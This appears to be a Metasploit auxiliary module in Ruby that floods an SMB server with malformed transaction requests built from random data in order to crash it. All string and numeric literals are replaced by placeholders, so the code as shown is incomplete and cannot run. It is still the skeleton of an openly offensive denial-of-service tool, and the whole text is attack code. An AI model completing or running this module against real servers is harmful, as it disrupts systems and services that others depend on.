require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: SMB :: Client include Msf :: Auxiliary :: Dos def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] ) ) end def run print_status ( <str> ) ; connect smb_login begin <int> . upto ( <int> ) do | i | print_status ( <str> i <str> ) ; self . simple . client . trans_nonull ( <str> Rex :: Text . rand_text_alphanumeric ( rand ( <int> ) + <int> ) <str> , <str> , Rex :: Text . rand_text_alphanumeric ( rand ( <int> ) + <int> ) , <int> , [ <int> , <int> , <int> ] . pack ( <str> ) , true ) end rescue :: Interrupt return rescue :: Exception = > e print_error ( <str> e . class <str> e <str> ) end disconnect end end 
